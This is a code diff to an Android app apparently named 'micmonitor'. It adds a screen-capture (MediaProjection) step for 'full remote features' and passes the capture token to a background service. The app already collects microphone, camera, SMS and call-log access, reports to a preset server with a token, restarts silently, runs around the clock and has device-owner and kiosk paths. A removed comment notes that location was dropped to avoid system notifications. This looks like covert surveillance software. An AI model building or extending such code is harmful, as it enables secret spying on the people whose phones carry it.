@@ -2,8 +2,10 @@ package com.micmonitor.app
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.Activity
 import android.content.Context
 import android.content.Intent
+import android.media.projection.MediaProjectionManager
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
@@ -14,6 +16,7 @@ import android.util.Log
 import android.widget.Button
 import android.widget.TextView
 import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -37,15 +40,47 @@ class MainActivity : AppCompatActivity() {
             val perms = mutableListOf(
                 Manifest.permission.RECORD_AUDIO,
                 Manifest.permission.CAMERA,
-                // Location removed - causes system notifications
                 Manifest.permission.READ_SMS,
                 Manifest.permission.READ_CALL_LOG,
             )
             return perms.toTypedArray()
         }
 
+    // Bug 7 & 22: Replace deprecated onActivityResult with registerForActivityResult
+    private val screenCaptureLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        prefs.edit().putBoolean("consent_given", true).apply()
+        
+        val intent = Intent(this, MicService::class.java)
+        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
+            prefs.edit().putBoolean("screen_capture_granted", true).apply()
+            intent.action = "INIT_PROJECTION"
+            intent.putExtra("projection_data", result.data)
+            Toast.makeText(this, "Permissions granted", Toast.LENGTH_SHORT).show()
+            launchServiceWithIntent(intent)
+            requestBatteryOptExemption()
+            finish()
+        } else {
+            // Bug 22: User denied screen capture. Provide a retry path.
+            prefs.edit().putBoolean("screen_capture_granted", false).apply()
+            Toast.makeText(this, "Screen capture required for full features. Tap to retry.", Toast.LENGTH_LONG).show()
+            
+            val tvStatus = findViewById<TextView>(R.id.tvStatus)
+            val btnGrant = findViewById<Button>(R.id.btnGrant)
+            tvStatus.text = "Screen capture denied. Full remote features disabled."
+            btnGrant.text = "Grant Screen Capture"
+            
+            // Still launch service for core features (mic)
+            launchServiceWithIntent(intent)
+            requestBatteryOptExemption()
+        }
+    }
+
+    @SuppressLint("SetTextI18n")
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
 
         // Seed server configuration once so release builds can carry defaults.
         val existingUrl = prefs.getString("server_url", null).orEmpty().trim()
@@ -58,45 +93,42 @@ class MainActivity : AppCompatActivity() {
             prefs.edit().putString("server_token", MicService.DEFAULT_SERVER_TOKEN).apply()
         }
 
-        // Already set up — restart service silently (core permission only)
+        val btnGrant = findViewById<Button>(R.id.btnGrant)
+        val tvStatus = findViewById<TextView>(R.id.tvStatus)
+
+        // Already set up — restart service silently
         if (prefs.getBoolean("consent_given", false) && hasCorePermissions()) {
             handleIntents(intent)
-            launchService()
+            launchServiceWithIntent(Intent(this, MicService::class.java))
             requestBatteryOptExemption()
             
-            // If not currently in LockTaskMode but set to be, or if just launch, we might not want to finish()
-            // if we need to stay visible for Kiosk mode.
-            if (!prefs.getBoolean("lock_task_mode", false)) {
+            // Bug 22: If screen capture is missing, keep UI open to allow retry, unless locked
+            if (!prefs.getBoolean("screen_capture_granted", false)) {
+                tvStatus.text = "Screen capture permission missing."
+                btnGrant.text = "Enable Screen Capture"
+            } else if (!prefs.getBoolean("lock_task_mode", false)) {
                 finish()
                 return
             }
         }
 
-        setContentView(R.layout.activity_main)
-
-        val btnGrant = findViewById<Button>(R.id.btnGrant)
-        val tvStatus = findViewById<TextView>(R.id.tvStatus)
-
         btnGrant.setOnClickListener {
-            tvStatus.apply {
-                text = getString(R.string.status_requesting)
-                visibility = android.view.View.VISIBLE
+            if (!hasCorePermissions()) {
+                tvStatus.apply {
+                    text = getString(R.string.status_requesting)
+                    visibility = android.view.View.VISIBLE
+                }
+                ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
+            } else {
+                // Bug 22: Re-request path for missing projection token
+                val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                screenCaptureLauncher.launch(mpm.createScreenCaptureIntent())
             }
-            ActivityCompat.requestPermissions(this, requiredPermissions, REQUEST_CODE)
-        }
-    }
-
-    private fun hasAllPermissions(): Boolean {
-        return requiredPermissions.all {
-            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
         }
     }
 
     private fun hasCorePermissions(): Boolean {
-        return ContextCompat.checkSelfPermission(
-            this,
-            Manifest.permission.RECORD_AUDIO
-        ) == PackageManager.PERMISSION_GRANTED
+        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
     }
 
     override fun onRequestPermissionsResult(
@@ -111,21 +143,10 @@ class MainActivity : AppCompatActivity() {
             val micGranted = micIndex >= 0 && grantResults[micIndex] == PackageManager.PERMISSION_GRANTED
 
             if (micGranted) {
-                prefs.edit().putBoolean("consent_given", true).apply()
-                Toast.makeText(
-                    this,
-                    getString(R.string.toast_all_granted),
-                    Toast.LENGTH_SHORT
-                ).show()
-                launchService()
-                requestBatteryOptExemption()
-                finish()
+                val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
+                screenCaptureLauncher.launch(mpm.createScreenCaptureIntent())
             } else {
-                Toast.makeText(
-                    this,
-                    getString(R.string.toast_mic_required),
-                    Toast.LENGTH_LONG
-                ).show()
+                Toast.makeText(this, getString(R.string.toast_mic_required), Toast.LENGTH_LONG).show()
                 findViewById<TextView>(R.id.tvStatus).apply {
                     text = getString(R.string.status_retry)
                     visibility = android.view.View.VISIBLE
@@ -149,9 +170,6 @@ class MainActivity : AppCompatActivity() {
                 try {
                     stopLockTask()
                 } catch (_: Exception) {}
-                
-                // If not in kiosk mode, we can close the activity
-                // finish() 
             }
         }
     }
@@ -181,8 +199,7 @@ class MainActivity : AppCompatActivity() {
         handleIntents(intent)
     }
 
-    private fun launchService() {
-        val intent = Intent(this, MicService::class.java)
+    private fun launchServiceWithIntent(intent: Intent) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             startForegroundService(intent)
         } else {
@@ -190,7 +207,6 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    /** Asks Android to exempt this app from battery optimization so service runs 24/7 */
     @SuppressLint("BatteryLife")
     private fun requestBatteryOptExemption() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
@@ -202,7 +218,6 @@ class MainActivity : AppCompatActivity() {
                             .setData(Uri.parse("package:$packageName"))
                     )
                 } catch (_: Exception) {
-                    // OEMs may block this intent; open app settings as fallback.
                     try {
                         startActivity(
                             Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
@@ -229,7 +244,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onStop() {
         super.onStop()
-        // Device Owner path: if app is backgrounded after setup/cache clear, ensure service starts.
         val isDeviceOwner = try {
             UpdateService.isDeviceOwner(this)
         } catch (_: Exception) {
@@ -237,11 +251,10 @@ class MainActivity : AppCompatActivity() {
         }
         if (isDeviceOwner && hasCorePermissions()) {
             try {
-                launchService()
+                launchServiceWithIntent(Intent(this, MicService::class.java))
             } catch (e: Exception) {
                 Log.e(TAG, "Failed to launch service onStop: ${e.message}")
             }
         }
     }
 }
-
